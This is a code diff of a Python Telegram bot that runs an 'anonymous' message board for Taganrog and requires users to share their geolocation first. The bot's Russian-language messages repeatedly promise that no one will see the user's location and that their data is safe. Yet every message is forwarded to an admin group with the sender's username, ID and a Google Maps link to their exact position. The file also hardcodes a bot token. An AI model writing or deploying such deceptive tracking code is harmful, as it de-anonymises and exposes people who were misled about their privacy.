@@ -8,7 +8,7 @@ TOKEN = "8089566253:AAGJSzNBhjgoEK5ZolkgIqH8a8Q99iPuu44"
 ANON_GROUP_LINK = "https://t.me/+Ql0IZosRRu82YTQy"
 ANON_GROUP_ID = -1002514617765
 FORWARD_GROUP_ID = -1002698558394
-VIDEO_LINK = "https://yandex.ru/video/touch/preview/18329427637174558155?reqid=1743686166846639-14632506106275850752-balancer-l7leveler-kubr-yp-klg-81-BAL&suggest_reqid=217726878173278270661672840126691&text=%D0%A1%D0%BA%D0%B8%D0%B1%D0%B5%D0%B4%D0%B5"
+VIDEO_LINK = "https://youtu.be/hK_cbdVPK-E"  # Новая переменная с видео
 
 # Геопараметры Таганрога
 TAGANROG_CENTER = (47.2364, 38.8953)
@@ -29,6 +29,21 @@ geo_keyboard = ReplyKeyboardMarkup(
     one_time_keyboard=True
 )
 
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Приветственное сообщение с уточнением о конфиденциальности"""
+    welcome_text = (
+        f"Привет! Для отправки сообщения сначала поделись своей геолокацией:\n\n"
+        f"🔒 <b>Конфиденциальность:</b>Никто не получит твою геопозицию (антиспам система)\n\n"
+        f"📹 <a href='{VIDEO_LINK}'>Видеоинструкция</a>"
+    )
+    
+    await update.message.reply_text(
+        welcome_text,
+        reply_markup=geo_keyboard,
+        parse_mode='HTML',
+        disable_web_page_preview=True
+    )
+
 def calculate_distance(lat1, lon1, lat2, lon2):
     """Вычисление расстояния между точками (в км)"""
     R = 6371
@@ -38,21 +53,11 @@ def calculate_distance(lat1, lon1, lat2, lon2):
     a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
     return R * (2 * atan2(sqrt(a), sqrt(1-a)))
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Приветственное сообщение"""
-    await update.message.reply_text(
-        "Привет! Для отправки сообщения сначала поделись своей геолокацией, ее никто не получит (антиспам):",
-        reply_markup=geo_keyboard
-    )
-
 async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка полученной геолокации"""
+    """Обработка геолокации с подтверждением конфиденциальности"""
     try:
         user = update.message.from_user
         location = update.message.location
-        
-        if not location:
-            raise ValueError("Геолокация не получена")
         
         # Вычисляем расстояние
         distance = calculate_distance(
@@ -61,101 +66,115 @@ async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         
         # Сохраняем данные
-        context.user_data['geo_verified'] = {
+        context.user_data['location'] = {
             'lat': location.latitude,
             'lon': location.longitude,
             'distance': distance,
             'valid': distance <= ALLOWED_RADIUS_KM
         }
         
+        # Ответ с подтверждением конфиденциальности
+        response = (
+            "✅ <b>Геолокация принята</b>\n\n"
+            f"📏 Расстояние до центра: {distance:.1f} км\n"
+        
+            "Теперь отправьте текст сообщения:"
+        )
+        
         await update.message.reply_text(
-            "✅ Геолокация получена! Теперь отправь текст сообщения.",
-            reply_markup=ReplyKeyboardMarkup.remove_keyboard()
+            response,
+            reply_markup=ReplyKeyboardMarkup.remove_keyboard(),
+            parse_mode='HTML'
         )
         
     except Exception as e:
         logger.error(f"Ошибка обработки геолокации: {e}")
         await update.message.reply_text(
-            "❌ Ошибка обработки геолокации. Пожалуйста, попробуйте еще раз.",
+            "❌ Ошибка обработки геолокации. Пожалуйста, попробуйте еще раз.\n\n"
+            ,
             reply_markup=geo_keyboard
         )
-        # Удаляем невалидные данные
-        if 'geo_verified' in context.user_data:
-            del context.user_data['geo_verified']
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка текстовых сообщений"""
+    """Обработка сообщений с напоминанием о конфиденциальности"""
     try:
         if update.message.chat.type != "private":
             return
             
-        # Проверяем наличие подтвержденной геолокации
-        if 'geo_verified' not in context.user_data:
+        # Проверяем наличие геолокации
+        if 'location' not in context.user_data:
             await update.message.reply_text(
-                "⚠️ Сначала отправь свою геолокацию:",
+                "⚠️ Сначала подтвердите ваше местоположение:\n\n"
+                "🔒 Никто не увидит вашу геопозицию",
                 reply_markup=geo_keyboard
             )
             return
             
         user = update.message.from_user
-        geo_data = context.user_data['geo_verified']
+        loc_data = context.user_data['location']
         
         # Формируем сообщение для админов
         admin_msg = (
-            f"👤 Отправитель: @{user.username or 'N/A'} (ID: {user.id})\n"
-            f"📍 Гео: https://maps.google.com/?q={geo_data['lat']},{geo_data['lon']}\n"
-            f"📏 Расстояние: {geo_data['distance']:.1f} км\n\n"
-            f"📝 Сообщение:\n{update.message.text}"
+            f"👤 Пользователь: @{user.username or 'N/A'} (ID: {user.id})\n"
+            f"📍 Гео: https://maps.google.com/?q={loc_data['lat']},{loc_data['lon']}\n"
+            f"📏 Расстояние: {loc_data['distance']:.1f} км\n\n"
+            f"📝 Сообщение:\n{update.message.text}\n\n"
+            f"📹 <a href='{VIDEO_LINK}'>Инструкция</a>"
         )
         
-        # Всегда отправляем админам
-        await context.bot.send_message(FORWARD_GROUP_ID, admin_msg)
+        # Отправляем админам
+        await context.bot.send_message(
+            FORWARD_GROUP_ID,
+            admin_msg,
+            parse_mode='HTML',
+            disable_web_page_preview=True
+        )
         
-        # Отправляем в анонимный чат только если в радиусе
-        if geo_data['valid']:
+        # Отправляем в анонимный чат если в радиусе
+        if loc_data['valid']:
             await context.bot.send_message(
                 ANON_GROUP_ID,
                 f"✉️ Анонимное сообщение:\n\n{update.message.text}",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔍 Открыть", url=VIDEO_LINK)]])
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔍 Открыть", url=ANON_GROUP_LINK)]])
             )
-            await update.message.reply_text("✅ Сообщение опубликовано!")
+            response = "✅ Сообщение опубликовано анонимно!"
         else:
-            await update.message.reply_text("❌ Вы вне зоны Таганрога. Сообщение не опубликовано.")
+            response = "❌ Вы вне зоны Таганрога. Сообщение доступно только администраторам."
             
+        await update.message.reply_text(response)
+        
         # Сбрасываем геоданные
-        del context.user_data['geo_verified']
+        del context.user_data['location']
         await update.message.reply_text(
-            "Для нового сообщения отправь геолокацию снова:",
+            "Для нового сообщения отправьте геолокацию снова:\n\n",
             reply_markup=geo_keyboard
         )
         
     except Exception as e:
         logger.error(f"Ошибка обработки сообщения: {e}")
         await update.message.reply_text(
-            "⚠️ Произошла ошибка. Пожалуйста, начните заново.",
+            "⚠️ Произошла ошибка. Ваши данные не были сохранены.\n"
+            "Пожалуйста, начните заново.",
             reply_markup=geo_keyboard
         )
-        # Сбрасываем состояние
-        if 'geo_verified' in context.user_data:
-            del context.user_data['geo_verified']
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Глобальный обработчик ошибок"""
-    logger.error(f"Глобальная ошибка: {context.error}")
+    """Обработчик ошибок с гарантией конфиденциальности"""
+    logger.error(f"Ошибка: {context.error}")
     if update and update.message:
         await update.message.reply_text(
-            "⚠️ Произошла системная ошибка. Пожалуйста, попробуйте позже.",
+            "⚠️ Техническая ошибка. Ваши данные в безопасности.\n"
+            "Попробуйте позже или обратитесь к администратору.",
             reply_markup=geo_keyboard
         )
 
 if __name__ == "__main__":
     app = ApplicationBuilder().token(TOKEN).build()
     
-    # Регистрация обработчиков
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.LOCATION, handle_location))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_error_handler(error_handler)
     
-    logger.info("Бот запущен")
+    logger.info("Бот запущен с системой конфиденциальности")
     app.run_polling()
